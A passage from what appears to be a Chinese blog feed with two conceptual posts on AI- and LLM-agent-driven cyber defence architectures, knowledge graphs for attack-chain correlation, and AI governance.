        <content type="html"><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>自动化防御作为网络安全防御的发展趋势，一直是研究和讨论的重点话题。关于人工智能如何在其中发挥作用，尤其是目前大语言模型带来的变革，使得这一领域的热度空前高涨。</p><span id="more"></span><h2 id="研究背景"><a href="#研究背景" class="headerlink" title="研究背景"></a>研究背景</h2><p>目前的网络安全面临的主要问题有：</p><ul><li>攻击技术日趋复杂：随着网络技术的不断发展，攻击者在攻击技术方面也不断创新，采用了更加复杂、隐蔽的攻击手段，传统的安全防护措施难以有效应对。</li><li>攻击目标日益扩大：随着网络技术的普及应用，网络空间已经成为人们工作、生活的重要场所，各种重要信息和系统都存储在网络空间中。攻击者不仅针对政府、企业等重要机构，也针对个人、家庭等普通用户发起攻击，攻击目标日益扩大。</li><li>攻击动机多样：攻击者的动机也越来越多样化，不仅有窃取数据、破坏系统等传统动机，还有破坏社会秩序、影响国家安全等动机。这也给网络安全防护带来了更大的挑战。</li><li>安全人才短缺：网络安全人才是网络安全防护的重要力量。随着网络安全形势日趋严峻，对网络安全人才的需求也越来越大。然而，目前我国网络安全人才短缺的现状依然存在。</li></ul><p>面对以上四个主要问题，AI技术具有巨大的潜力，可以有效应对上述挑战，</p><ul><li>针对攻击技术日趋复杂的挑战：<ul><li>AI可以利用大数据分析技术，从海量数据中发现潜在的威胁，并对威胁进行深入分析，识别其攻击意图和行为模式，提高威胁检测和分析能力。</li><li>AI可以用于开发新的安全防护技术，相较于传统规则检测技术有着更好的泛化能力，从而更加有效地防御复杂、隐蔽的攻击。</li></ul></li><li>针对攻击目标日益扩大的挑战：<ul><li>AI可以用于自动化执行安全防护任务，例如漏洞扫描、威胁情报分析等，从而减轻安全人员的工作负担，提高安全防护的效率。</li><li>AI可以根据不同目标的特点，制定针对性的安全防护措施，从而提高安全防护的效果。</li></ul></li><li>针对攻击动机多样化的挑战：<ul><li>AI可以用于综合运用多种安全防护措施，从而提高安全防护的综合效果。</li><li>AI可以根据攻击动机的变化，调整安全防护措施，从而提高安全防护的灵活性。</li></ul></li><li>针对安全人才短缺的挑战：<ul><li>AI可以用于辅助安全人员执行安全防护任务，从而提高安全人员的工作效率。</li><li>AI可以用于自动化执行安全防护任务，从而减轻安全人员的工作负担。</li></ul></li></ul><p>总体而言，AI具有强大的学习和分析能力，可以有效应对网络安全面临的各种挑战，为提高网络安全水平提供新的思路和途径。</p><h2 id="一些概念"><a href="#一些概念" class="headerlink" title="一些概念"></a>一些概念</h2><p>人工智能（Artificial Intelligence）或者说 AI 是一个耳熟能详的名词。人工智能的潜在目标或定义包含以下四个方面：</p><ul><li>思维模仿（Thinking Humanly）：通过人工智能技术使计算机系统能够模仿人类思维模式，包括推理、学习、问题解决等方面。</li><li>行为模仿（Acting Humanly）：使计算机系统能够表现出类似人类行为的特征，如语言交流、感知环境、执行任务等，以实现与人类的自然交互。</li><li>理性思考（Thinking Rationally）：通过逻辑推理、推断和问题求解等技术，使计算机能够以理性的方式思考和决策，而不仅仅是模仿人类的行为。</li><li>理性行为（Acting Rationally）：使计算机系统能够基于逻辑推理和准则行动，以实现在特定环境下最优化的决策和行为，而不一定模仿人类的行为方式。</li></ul><p>另一个概念叫做 Intelligence Agent，简称 IA，直译为智能代理或者智能实体。早在 18，19 世纪，哲学家 Denis Diderot 就提出了类似的概念，“如果找到一只能够回答所有事情的鹦鹉，那我毫不犹豫的称它是一个智能体。“事实上，关于 Agent 的概念，其根源可追溯到亚里士多德和休谟等有影响力的思想家。从一般意义上讲，Agent 是指具有行动能力的实体，Agent 的概念涉及自主性，有着行使意志、做出选择和采取行动的能力，而不是被动地对外部刺激做出反应。在人工智能领域，Agent 是一种计算实体。从本质上讲，AI Agent 并不等同于哲学上的 Agent；相反，它是 Agent 这一哲学概念在人工智能领域的具体化。我们将 AI Agent 视为能够使用传感器感知周围环境，做出决策，然后使用执行器采取行动的人造实体。</p><p>IA 的发展趋势大致如下：</p><ul><li>从最开始的符号式 Agents，典型代表为基于知识库的专家系统；</li><li>接着是反应式 Agents，根据环境的变化作出相应行动；</li><li>然后是如 AlphaGo 一般基于强化学习技术的 Agents；</li><li>再下面是结合了迁移学习和元学习技术的 Agents；</li><li>大语言模型横空出世之后，目前基于大语言模型的 Agents 成为全新的研究方向。</li></ul><h2 id="整体架构"><a href="#整体架构" class="headerlink" title="整体架构"></a>整体架构</h2><p>为此我们提出基于GDDRR模型的智能防御体系，主要理念是在实战中实现治理、检测、决策、响应、恢复五项任务的快速高效循环。在智能 Agents 驱动下的智能防御体系概述如下：</p><ul><li>为了实现系统高效运行，基于 Stix 2.1 框架，我们设计了一套完整的安全数据表示框架。在治理阶段，如威胁情报、资产台账、安全运营数据等均转换到统一的数据表示框架中去。通过知识图谱技术，存储到图数据库中，便于建立和展示数据实体间的相互关系。该阶段可参与的 Agents 类型包括符号式 Agents，反应式 Agents 以及大语言模型 Agents。</li><li>在检测阶段，符号式 Agents，具有迁移学习和元学习功能的 Agents 以及基于大语言模型的 Agents 通过学习人类安全专家的思维行为范式，在传统的基于机器学习、深度学习的检测小模型以及基于 pattern 匹配的规则引擎辅助下，快速高效的实现单步攻击识别。并在接下来的决策阶段，通过上下文的关联分析，将多种单步攻击串联，以攻击链的形式识别复合攻击，生成安全事件。</li><li>在响应和恢复阶段，反应式 Agents，基于强化学习技术的 Agents，联合迁移学习和元学习 Agents和大语言模型 Agents，根据单步攻击和复合攻击的研判结果，与对应安全产品交互，执行攻击阻断和风险修复的动作。</li><li>接下来又开始新一轮的循环，在全新的治理阶段中，更新上一轮循环提炼出的资产信息变更、运营数据变更以及攻防技战法等数据。循环往复，实现自洽的智能防御体系。</li></ul><h2 id="具体结构"><a href="#具体结构" class="headerlink" title="具体结构"></a>具体结构</h2><p>以大语言模型 Agents 为例，我们认为 IA 可分为 3 个模块，脑模块，感知模块和行动模块。</p><h3 id="脑模块"><a href="#脑模块" class="headerlink" title="脑模块"></a>脑模块</h3><p>脑模块作为 IA 的中央处理核心，它的首要功能是自然语言交互功能，其中涉及到核心问题有：</p><ul><li>多轮交互下的信息有效性和统一性问题；</li><li>高质量自然语言生成问题；</li><li>语言中隐藏含义的理解问题等。</li></ul><p>第二个功能涉及到知识领域，每个 IA 需要了解对应的知识，大体上可分为 3 种：</p><ul><li>语言知识，意味着 IA 需要了解输入的统一数据表示的意义；</li><li>常识知识；</li><li>专业领域知识。</li></ul><p>第三个是记忆功能，如何保证多轮交互以及多 Agent 交互之后的信息同步是很重要的课题。为此可能的解决办法有：</p><ul><li>提升 transformer 模型的长度限制；</li><li>将信息抽象提炼，再存入记忆模块；</li><li>压缩信息，寻找更为高效的信息表示方法；</li><li>共享记忆，类似外挂知识库的方案，但是这种做法又会涉及到数据隐私和安全的问题，我们后面再讨论。</li></ul><p>第四个是推理和规划功能，旨在培养 IA 形成人类一样的链式思维，一步一步的进行推导和规划。</p><p>最后是学习功能，为了形成自洽的系统，IA 必须要自主学习，从而摆脱必须依赖人类指令运行的情况。</p><h3 id="感知模块"><a href="#感知模块" class="headerlink" title="感知模块"></a>感知模块</h3><p>第二个是感知模块，这个模块相对而言比较简单明了，就是将多源异构的数据转换成统一的数据表示。</p><h3 id="行为模块"><a href="#行为模块" class="headerlink" title="行为模块"></a>行为模块</h3><p>最后一个是行为模块，这也是 IA 相对比较重要的模块。主要分为 2 个子功能：</p><ul><li>第一个是文字输出功能，即将抽象的统一数据转换成人类理解的自然语言。</li><li>第二个是工具模块。这里主要考虑的是在响应和恢复阶段，IA 需要能够根据分析研判结果，调用甚至制造对应的工具实现攻击阻断和风险修复等工作任务。</li></ul><h3 id="信息交互"><a href="#信息交互" class="headerlink" title="信息交互"></a>信息交互</h3><p>介绍完 Agent 架构之后，下面简要介绍一下系统内信息交互的模式。</p><p>首先对于单个 Agent 来说，主要分为3种情况：</p><ul><li>第一种是任务导向，那么这个 IA 只需要接受输入，根据人类指定的行为范式给出输出；</li><li>第二种是灵感导向，意思是人类给出一个目标，IA从结果逆推，自行寻找需要的输入并完成目标；</li><li>第三种是生命周期导向，是指类似 AutoGPT 那样的实体，自身实现一个任务的闭环运行无需人类的指令。</li></ul><p>对于 Agents 之间的交互场景概括起来其实很简单，就分为两种情况：</p><ul><li>一是多个 Agents 合作完成任务的模式；</li><li>二是 Agents 之间通过对抗的模式相互促进。</li></ul><p>最后是人机交互，也分为两种情况：</p><ul><li>一是指导-执行范式。指人类给出指令，指导 IA 执行对应动作；</li><li>二是合作范式，指人咧和机器合作完成相应任务目标。</li></ul><h2 id="困难与挑战"><a href="#困难与挑战" class="headerlink" title="困难与挑战"></a>困难与挑战</h2><p>理论框架介绍完成之后，接下来是面临的一些困难和挑战：</p><ul><li>首先是数据隐私和安全问题。目前以及未来都面临着 Agent 即服务的情况，指的是 Agent 就是人机交互的接口。IA 需要接触大量的数据去完成对应的任务，与之交互的人也就等于变相的接触到了这些数据。如何在这个环节中做好隐私数据防泄露，数据访问控制等问题至关重要。</li><li>第二个问题是，AI 模型本身因为数据集不平衡，算法不公平等客观条件的制约，存在定型观念和偏见。如何在多 Agents 交互的系统中始终保证平衡，不因为害群之马导致整个系统偏离方向也是个挑战。</li><li>为此，针对这样一个自洽的系统，需要一套行之有效的评估系统和约束手段，包含但不限于数据治理、算法治理、系统治理和伦理治理等方面。</li></ul><p>除了上面提到的困难与挑战，其实还有两点疑思值得进一步研究：</p><ul><li>首先是可信度问题。当人过于依赖智能的时候，保证结果的高置信度就是极大的考验，一些简单的小模型能够做到这一点，但是上升到庞大的系统可能需要全新的机制来保障。</li><li>其次是可靠性问题。对抗训练是目前机器学习领域热门的话题，即如何保证模型的鲁棒性，使其即使在受到特定攻击的情况下依然能够给出正确的判别结果。</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以大语言模型为代表的 AI 技术给未来的体系架构带来了无限的可能，当然其中也暗藏着种种问题。当然我们应该对 AI 技术保持信心，毕竟它已经实现了许多人类之前难以想象的功能。未来的研究方向将聚焦于智能 Agent 的新方向，以及人工智能技术与网络安全自动化防御的更多结合。</p>]]></content>
      
      
      <categories>
          
          <category> Theories </category>
          
          <category> AI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NLP </tag>
            
            <tag> IA </tag>
            
            <tag> GenAI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>智能防线：AI 驱动的网络空间防御体系</title>
      <link href="/2023/10/19/IntelligenceDefence/"/>
      <url>/2023/10/19/IntelligenceDefence/</url>
      
        <content type="html"><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>本文论题为《智能防线：AI 驱动的网络空间防御体系》，主要从人工智能在网络空间安全智能防御体系中的现状、挑战、机遇与应用前景等方面综合阐述 AI + 智能防御的理念。</p><span id="more"></span><h3 id="网络安全目前面临的挑战"><a href="#网络安全目前面临的挑战" class="headerlink" title="网络安全目前面临的挑战"></a>网络安全目前面临的挑战</h3><p>网络安全目前面临的挑战主要包括以下几个方面：</p><ul><li>攻击技术日趋复杂：随着网络技术的不断发展，攻击者在攻击技术方面也不断创新，采用了更加复杂、隐蔽的攻击手段，传统的安全防护措施难以有效应对。例如，勒索软件攻击、供应链攻击、零日漏洞攻击等，都对网络安全造成了严重威胁。</li><li>攻击目标日益扩大：随着网络技术的普及应用，网络空间已经成为人们工作、生活的重要场所，各种重要信息和系统都存储在网络空间中。攻击者不仅针对政府、企业等重要机构，也针对个人、家庭等普通用户发起攻击，攻击目标日益扩大。</li><li>攻击动机多样：攻击者的动机也越来越多样化，不仅有窃取数据、破坏系统等传统动机，还有破坏社会秩序、影响国家安全等动机。这也给网络安全防护带来了更大的挑战。</li><li>安全人才短缺：网络安全人才是网络安全防护的重要力量。随着网络安全形势日趋严峻，对网络安全人才的需求也越来越大。然而，目前我国网络安全人才短缺的现状依然存在。</li></ul><h3 id="AI-在解决网络安全问题中的潜力"><a href="#AI-在解决网络安全问题中的潜力" class="headerlink" title="AI 在解决网络安全问题中的潜力"></a>AI 在解决网络安全问题中的潜力</h3><p>人工智能（AI）在解决网络安全问题方面具有巨大的潜力，可以有效应对上述挑战，</p><p>针对攻击技术日趋复杂的挑战，AI可以通过以下方式发挥作用：</p><ul><li>提高威胁检测和分析能力。AI可以利用大数据分析技术，从海量数据中发现潜在的威胁，并对威胁进行深入分析，识别其攻击意图和行为模式。</li><li>开发新的安全防护技术。AI可以用于开发新的安全防护技术，例如基于机器学习的防火墙、入侵检测系统等，这些技术可以更加有效地防御复杂、隐蔽的攻击。</li></ul><p>针对攻击目标日益扩大的挑战，AI可以通过以下方式发挥作用：</p><ul><li>提高安全防护的自动化水平。AI可以用于自动化执行安全防护任务，例如漏洞扫描、威胁情报分析等，从而减轻安全人员的工作负担，提高安全防护的效率。</li><li>提高安全防护的针对性。AI可以根据不同目标的特点，制定针对性的安全防护措施，从而提高安全防护的效果。</li></ul><p>针对攻击动机多样化的挑战，AI可以通过以下方式发挥作用：</p><ul><li>提高安全防护的综合性。AI可以用于综合运用多种安全防护措施，从而提高安全防护的综合效果。</li><li>提高安全防护的弹性。AI可以根据攻击动机的变化，调整安全防护措施，从而提高安全防护的灵活性。</li></ul><p>针对安全人才短缺的挑战，AI可以通过以下方式发挥作用：</p><ul><li>辅助安全人员工作。AI可以用于辅助安全人员执行安全防护任务，从而提高安全人员的工作效率。</li><li>自动化执行安全防护任务。AI可以用于自动化执行安全防护任务，从而减轻安全人员的工作负担。</li></ul><p>总体而言，AI具有强大的学习和分析能力，可以有效应对网络安全面临的各种挑战，为提高网络安全水平提供新的思路和途径。</p><h2 id="AI-对网络安全的革命性影响"><a href="#AI-对网络安全的革命性影响" class="headerlink" title="AI 对网络安全的革命性影响"></a>AI 对网络安全的革命性影响</h2><h3 id="AI-技术的简要概述"><a href="#AI-技术的简要概述" class="headerlink" title="AI 技术的简要概述"></a>AI 技术的简要概述</h3><p>人工智能的潜在目标或定义：</p><ul><li>思维模仿（Thinking Humanly）：通过人工智能技术使计算机系统能够模仿人类思维模式，包括推理、学习、问题解决等方面。</li><li>行为模仿（Acting Humanly）：使计算机系统能够表现出类似人类行为的特征，如语言交流、感知环境、执行任务等，以实现与人类的自然交互。</li><li>性思考（Thinking Rationally）：通过逻辑推理、推断和问题求解等技术，使计算机能够以理性的方式思考和决策，而不仅仅是模仿人类的行为。</li><li>理性行为（Acting Rationally）：使计算机系统能够基于逻辑推理和准则行动，以实现在特定环境下最优化的决策和行为，而不一定模仿人类的行为方式。</li></ul><h3 id="AI-在网络安全中的应用案例"><a href="#AI-在网络安全中的应用案例" class="headerlink" title="AI 在网络安全中的应用案例"></a>AI 在网络安全中的应用案例</h3><p>人工智能（AI）在网络安全领域的应用日益广泛，以下是目前部分应用场景</p><ul><li>威胁检测和分析：基于机器学习的威胁检测和分析系统，这些系统可以从海量数据中发现潜在的威胁，并对威胁进行深入分析，识别其攻击意图和行为模式。</li><li>安全防护：基于机器学习的防火墙、入侵检测系统等，这些技术更加有效地防御复杂、隐蔽的攻击。</li><li>安全运营：自动化执行安全运营任务，例如漏洞扫描、威胁情报分析等，从而减轻安全人员的工作负担，提高安全运营的效率。</li></ul><h3 id="AI-在提高网络安全性能方面的潜在优势"><a href="#AI-在提高网络安全性能方面的潜在优势" class="headerlink" title="AI 在提高网络安全性能方面的潜在优势"></a>AI 在提高网络安全性能方面的潜在优势</h3><p>AI在提高网络安全性能方面具有许多潜在优势，其中一些包括：</p><ul><li>实时威胁检测：AI可以实时监测和分析网络活动，并快速检测到潜在的安全威胁，从而提高威胁检测的速度和准确性。</li><li>智能自动化响应：借助AI的自动化能力，可以快速响应安全威胁，自动隔离受感染的设备或阻止恶意流量，从而加快安全事件的响应速度并降低潜在的损失。</li><li>异常行为识别：AI可以识别网络中的异常行为模式，并自动发出警报或阻止可疑的活动，从而帮助提高对新型威胁的识别能力。</li><li>自动化安全补丁管理：AI可以帮助自动管理系统和软件的安全补丁更新，确保网络中的设备始终处于最新的安全状态，从而减少由于漏洞和脆弱性导致的安全风险。</li><li>大规模数据分析：AI可以分析和处理大规模的安全数据，从而识别出潜在的威胁模式和趋势，帮助提前预防未来可能的网络安全威胁。</li><li>智能身份验证和访问控制：AI可以实现更强大的身份验证和访问控制，包括基于生物特征的身份识别和行为分析，从而提高网络中数据和资源的安全性。</li></ul><p>通过利用这些潜在优势，AI可以在提高网络安全性能方面发挥重要作用，帮助组织应对日益复杂的网络安全威胁和风险。</p><h3 id="大语言模型带来的行业冲击与变革"><a href="#大语言模型带来的行业冲击与变革" class="headerlink" title="大语言模型带来的行业冲击与变革"></a>大语言模型带来的行业冲击与变革</h3><p>从 2018 年的 GPT-1，到 2022 年 11 月正式发布的 ChatGPT，再到 2023 年 3 月发布的最新 GPT-4，大语言模型的浪潮也给网络安全行业带来巨大的变革， 包括但不限于以下几个方面：</p><ul><li>增强攻击能力：恶意行为者可以利用大语言模型的能力来生成更真实、更具欺骗性的网络钓鱼邮件、虚假信息以及伪造的内容，使得传统的安全防御手段变得更加困难。</li><li>智能安全防御：大语言模型的引入推动了智能安全防御技术的发展，使得安全防御系统具备更强大的自动化和智能化能力，能够更准确地识别和应对复杂的网络安全威胁。</li><li>数据隐私挑战：大语言模型在训练过程中需要大量的数据，这可能涉及到大量的个人隐私信息。网络安全行业面临着确保这些数据安全的挑战，包括加强数据保护、隐私保密和安全存储等方面的工作。</li><li>新型安全解决方案：针对大语言模型带来的新型安全挑战，网络安全行业不断探索并研发新的安全解决方案，包括基于AI的安全分析、大数据分析技术、以及对抗生成网络（GAN）等技术的应用，以提升网络安全的防御能力。</li><li>人才需求变化：随着大语言模型技术的不断发展，网络安全行业对具备AI技术背景的专业人才的需求日益增加，这促使了相关人才的培养和网络安全领域的人才结构调整。</li></ul><p>总的来说，大语言模型的出现既带来了网络安全行业面临的新挑战，也催生了一系列新的安全解决方案和发展机遇，推动了网络安全行业朝着更加智能化、自动化和专业化的方向发展。</p><h2 id="AI-治理下的网络安全挑战与未来展望"><a href="#AI-治理下的网络安全挑战与未来展望" class="headerlink" title="AI 治理下的网络安全挑战与未来展望"></a>AI 治理下的网络安全挑战与未来展望</h2><h3 id="隐私保护与数据安全挑战"><a href="#隐私保护与数据安全挑战" class="headerlink" title="隐私保护与数据安全挑战"></a>隐私保护与数据安全挑战</h3><p>在当前以及即将到来的 AI 驱动下的智能防御体系中，网络安全隐私保护与数据安全面临着诸多挑战，包括但不限于以下几个方面：</p><ul><li>隐私数据泄露风险：在AI分析和处理数据的过程中，存在着隐私数据泄露的风险，尤其是在涉及个人敏感信息的场景中，需要采取有效措施确保数据的安全性和隐私性。</li><li>数据访问控制困难：在复杂的网络环境下，管理和控制数据的访问权限变得更加困难，特别是当涉及多个数据源和多个AI模型的情况下，确保数据只被授权的人员和系统访问是一个挑战。</li><li>数据集成与安全性：在整合不同来源的数据用于AI分析时，需要解决数据的完整性、一致性和安全性问题，确保数据集成的过程不会导致数据泄露或篡改。</li><li>数据算法安全性：AI算法的安全性也是一个挑战，恶意用户可以通过操纵训练数据或者攻击AI模型来获取敏感信息，因此需要加强对算法的安全性分析和保护措施。</li><li>法规合规与数据安全：在数据传输和处理过程中，由于数据保护法规存在差异，合规性问题成为数据安全的重要考量因素，需要建立符合不同法规的数据安全管理制度。</li></ul><p>为应对这些挑战，需要建立完善的数据安全管理制度和隐私保护机制，包括加密技术的应用、访问控制的强化、安全审计和监控系统的建立，以及遵循法规合规标准等措施，以确保在AI治理下网络安全隐私保护与数据安全得到有效维护。</p><h3 id="建立可信的-AI-治理框架"><a href="#建立可信的-AI-治理框架" class="headerlink" title="建立可信的 AI 治理框架"></a>建立可信的 AI 治理框架</h3><p>可信的 AI 治理框架应该从以下几个方面入手：</p><ul><li>数据治理：确保 AI 系统使用的数据安全可靠、符合隐私保护要求。<ul><li>制定数据采集、使用、存储、销毁等方面的规范，确保数据安全可靠、符合隐私保护要求。</li><li>建立数据安全审计制度，定期对数据进行安全检查，发现和修复安全漏洞。</li><li>完善用户隐私保护机制，保障用户的知情权、选择权和同意权。</li></ul></li><li>算法治理：确保 AI 系统的算法透明可解释、公平无偏。<ul><li>要求 AI 系统的算法透明可解释，使用户能够理解 AI 系统的决策过程。</li><li>建立算法公平性评估机制，确保 AI 系统的决策结果公平无偏。</li><li>制定算法安全审计规范，定期对算法进行安全检查，发现和修复安全漏洞。</li></ul></li><li>系统治理：确保 AI 系统的安全性、可靠性、可持续性。<ul><li>制定 AI 系统的安全设计规范，确保 AI 系统的安全性和可靠性。</li><li>建立 AI 系统的安全测试机制，确保 AI 系统能够抵御常见的攻击。</li><li>制定 AI 系统的安全应急响应预案，快速响应和处置安全事件。</li></ul></li><li>伦理治理：确保 AI 系统的使用符合伦理规范。<ul><li>制定 AI 系统的伦理规范，确保 AI 系统的使用符合伦理要求。</li><li>建立 AI 系统的伦理审查机制，确保 AI 系统的使用符合伦理规范。</li></ul></li></ul><h3 id="面向未来的网络空间智能防御体系"><a href="#面向未来的网络空间智能防御体系" class="headerlink" title="面向未来的网络空间智能防御体系"></a>面向未来的网络空间智能防御体系</h3><p>提到智能防御体系，肯定离不开人工智能技术的加持。传统的人工智能在安全领域的应用局限于单点的小模型，无法在全局上把握安全态势，依然需要大量的安全专家投入海量数据的分析整合。在大模型介入之后，通过其优秀的文本理解能力和文本生成能力，有希望作为调度中台，扮演安全专家的角色，收集规则引擎或人工智能小模型的研判结果并分析上下文，确定安全事件后联动安全产品及时响应。</p><p>智能代理（Intelligence Agents）的概念并不陌生，借鉴斯坦福大学研究的 AI 小镇项目，结合大模型提出了生成式代理（Generative Agents）这一角色。根据他们的研究，建立 25 个独立的生成式代理，通过共享记忆等机制保证信息在代理间传递的统一性，实现了一个一定程度上自洽的社会。这个项目给力我们一定的启发，在智能防御体系中，我们也可以定向的训练出不同用途的生成式代理，它们各司其职，最终实现一个完整自洽的分析研判，联动防御的自动化系统。</p><p>为了实现这样的目标，需要进一步研究的技术包括：</p><ul><li>网络安全知识的抽取和融合<ul><li>网络安全知识的来源广泛，包括漏洞库、病毒库、告警数据、安全厂商的检测结果、安全论坛、网络安全事件报告资产描述等，为构建大规模的网络安全知识大脑，需要首先从不同来源的网络安全数据中抽取知识，并对不同领域的网络安全知识进行有效融合。</li><li>网络安全数据主要以文本数据、结构化数据、 半结构化数据等类型为主，可以采用人工智能技术对数据进行抽取。例如，可以使用word2vec 技术将文本中的单词转换为向量，结合卷积神经网络 （CNN），BiLSTM，条件随机场算法（CRF）等技术进行实体和关系识别，同时按照网络安全知识的类型进行分类，并将分类以后的实体和关系添加到对应网络安全知识的实例中进行保存。</li><li>由于网络安全中用于训练的预料数据有限，可能无法覆盖所有的网络安全知识，因此需要根据已有的网络安全知识进行推理，生成新的知识。此类知识推理的方法主要包括两种，一种是自定义推理规则，根据预先制定的规则进行知识推理和演绎；第二种是采用智能化技术，根据已有的知识进行概率推理，计算新知识存在的概率。第一种方法需要人为地定义推理规则，可扩展性较差；第二种方法使用深度神经网络进行计算新知识存在的概率，可扩展性强，但是可解释性较第一种方法差一些。</li><li>不同数据源抽取得到的网络安全知识可能会有不同的描述方式，因此需要对网络安全知识进行有效融合。常用的融合方法包括实体对齐、基于知识表示的消歧等，基本思想是将不同的网络安全知识库按照实体和关系的统一描述进行融合。</li></ul></li><li>网络安全知识表示<ul><li>常用的知识表示模型包括符号逻辑、语义网、专家系统、知识图谱、MDATA 模型等，通过知识表示可以将网络安全中不同类型的知识描述为统一的形式，并可通过知识的向量化进行高效计算。</li><li>知识图谱主要采用”&lt; 实体，关系，实体 &gt;”这种三元组形式对具体的知识进行表示。知识图谱能有效描述网络安全知识，但是当知识动态变化时，对应的三元组及相关联的知识很难及时更新。</li><li>MDATA 模型对实体之间的关系、属性的时空特性进行表达，从而有效表示网络安全知识的动态变化情况。具体而言，在关系和实体属性上增加了时间和空间特性，如某系统存在漏洞的知识，添加存在漏洞的时间区间，从而能更详细地表示系统的实际安全情况。网络攻击可能通过不同的 IP（网络 之间互连的协议）地址等，攻击事件中的 IP 地址等特性则作为网络安全知识中的空间特性。MDATA 模型通过对时间、空间特性的描述，可以表示出网络安全知识的动态变化过程。</li></ul></li><li>网络安全知识大脑构建<ul><li>网络安全知识大脑的构建包括两部分：网络安全知识库（SeKG）和场景知识库（ScKG）。其中，网络安全知识库是通用的网络安全知识的集合，并且可以随时或定期更新补充；而场景知识库是特定知识的集合，可以依据仿真攻击的设定而定，也是描述具体攻击行为的知识库。</li><li>网络安全知识库和场景知识库可以根据概念、实例、关系、属性、规则的五元组模型进行构建。</li></ul></li><li>基于网络安全知识大脑的攻击事件研判<ul><li>网络空间防御面临的主要威胁是网络攻击，一般而言网络攻击可以分为单步攻击和复合攻击。单步攻击可以理解为针对某资产发动的离散的攻击，而复合攻击可以理解为是有多个单步攻击排列组合而成的，也就是说复合攻击有多个攻击步骤，而这些攻击步骤之间是有关系的，不是离散的、无关联的，攻击步骤之间有因果关系、顺承关系、选择关系等。</li><li>单步攻击的研判相对而言简单，已有的基于规则、特征的检测方法能取得很高的成功率。而复合攻击的检测难度大，典型的复合攻击包括 APT 攻击等。复合攻击通常是以攻击链的形式发生的，可以看作是多个单步攻击的排列组合。</li><li>使用网络安全知识大脑研判网络攻击时，可利用有限状态机，设置初始状态、中间状态、终止状态和触发条件，并添加容错机制，可以在缺失数据的时候仍然生成复合攻击的攻击链，在网络安全知识库和场景知识库的基础上，描述复合攻击的各个步骤之间的关系，然后根据攻击步骤的关系、时间先后关系、IP 的传播关系等来判断是否可以生成攻击链。如果满足，则输出复合攻击的攻击链，如果不满足，就去知识库中查找等价的步骤，或补充生成攻击链并输出。当输入的数据中存在误报和漏报的情况时，基于网络安全知识大脑的研判可以自动补全缺失的信息，生成一条完整的攻击链，从而提高攻击研判的准确率，为网络安全主动防御提供支撑。</li></ul></li></ul><h2 id="结论与行动呼吁"><a href="#结论与行动呼吁" class="headerlink" title="结论与行动呼吁"></a>结论与行动呼吁</h2><h3 id="总结-AI-在网络安全中的关键作用"><a href="#总结-AI-在网络安全中的关键作用" class="headerlink" title="总结 AI 在网络安全中的关键作用"></a>总结 AI 在网络安全中的关键作用</h3><p>网络空间安全相关的数据体量大、数据种类多、数据增长快，传统的分析技术在处理此类数据时效率低、准确率低。人工智能在处理海量数据、多源数据、动态数据等方面具有显著的优势，能助力于网络空间安全，提升网络防御能力。</p><ul><li>海量数据的快速处理能力：网络空间安全相关的数据体量大，例如系统中保存的日志数据、网络流量数据等，处理如此海量的数据既需要庞大的算力支撑，也需要能处理如此海量数据的智能算法。由于人工智能技术能从海量数据中学习数据的特征，根据特征再对数据进行分类、聚类等处理，能大幅度提升效率和准确度。</li><li>多源异构数据的高效关联能力：网络安全相关的数据种类繁多、来源广泛，如通过传感器、网络爬虫、日志收集系统等能采集到不同类型的数据，从来源上数据类型可以分为环境业务数据、网络层数据、日志层数据、告警数据等类别，综合不同来源的异构数据进行综合分析能提升网络空间主动防御能力。</li><li>动态数据的实时在线处理能力：网络空间安全相关的数据增长速度快，时效性要求高。专家系统的缺陷在于专家知识更新慢，利用专家系统能快速检测已知的网络攻击，但是对于未知的网络攻击事件，专家系统的知识往往由于更新不及时，导致系统无法正确检测。此时，需要结合人工智能技术赋予的预测能力，对动态的数据设计在线算法，能够结合已有的网络安全知识和实时的数据判断当前的潜在网络攻击；根据已经发生的攻击事件和历史数据，建立攻击预测模型，预测未来可能发生的攻击行为，通过人工智能技术增强系统的预测能力，提供动态防御能力，提升网络安全事件的快速响应能力。</li></ul><h3 id="提出行动和解决方案"><a href="#提出行动和解决方案" class="headerlink" title="提出行动和解决方案"></a>提出行动和解决方案</h3><p>构建动态可扩展的网络安全知识大脑</p><ul><li>充分利用人工智能技术在处理海量数据、多源异构数据、实时动态数据等方面的显著优势，构建动态可扩展的网络安全知识大脑，提升网络空间防御能力。</li><li>具体而言，针对网络安全知识描述中多实体、弱关系、时空复杂性和多来源等特点，对于结构化、半结构化和非结构化的数据，基于 MDATA 知识表示模型、网络安全知识语料库中的特定表达和网络安全知识之间特有的逻辑关系和对应关系，构建相应的网络安全本体模型，实现多领域知识的统一表示，相较于传统的知识图谱等知识表示模型，可提升融合效率和多领域动态知识统一表示的准确率。</li><li>在此基础上，针对半结构化数据和非结构化数据知识抽取难的问题，基于构建的本体模型，结合双向循环神经网络和条件随机场等深度学习方法，进行特征抽取、联合标记、类别标记等。对于未被识别出的本体进行人工抽取，从而确保基于本体模型生成的三元组知识在逻辑上是正确的，实现动态可扩展的网络安全知识大脑，为网络安全防御提供强大的具有自学习能力的知识库支撑。</li></ul><p>推动有效网络攻击的智能化检测</p><ul><li>针对网络攻击越来越智能化，大规模网络攻击越来越频繁，网络攻击的隐蔽性越来越高的特点，遵循网络攻击的基本规律，基于构建的网络安全知识库，实现复杂网络攻击的智能化检测算法。可将网络安全事件和攻击的基本信息存储于安全知识图谱中，通过采集数据与安全知识图谱进行匹配，根据状态的触发约束，可分析得到网络系统中的单步攻击和复合攻击。</li><li>一般而言，检测复合攻击时可以分析出攻击的当前阶段，无法确保输出完整攻击链，因此可进一步基于攻击规则库的复合攻击研判技术，将先验知识存入网络安全知识图谱和复合攻击规则库，基于大数据分析平台，通过采集数据与安全知识图谱进行匹配，再经过时空属性和复合攻击规则库的共同约束，从海量的数据中挖掘出有效的攻击链，并完善复合攻击的攻击链，实现自动化分析攻击目的和意图等。针对传统方法无法应对输入的数据中误报和漏报的情况，可以基于多模态数据的复合攻击研判，当输入的数据中存在误报和漏报的情况时，可以自动补全缺失的信息，并计算生成不同攻击链的概率，消除误报和漏报的影响。进一步，可通过网络仿真平台对攻击事件进行仿真，将分析结果与仿真攻击的信息进行对比，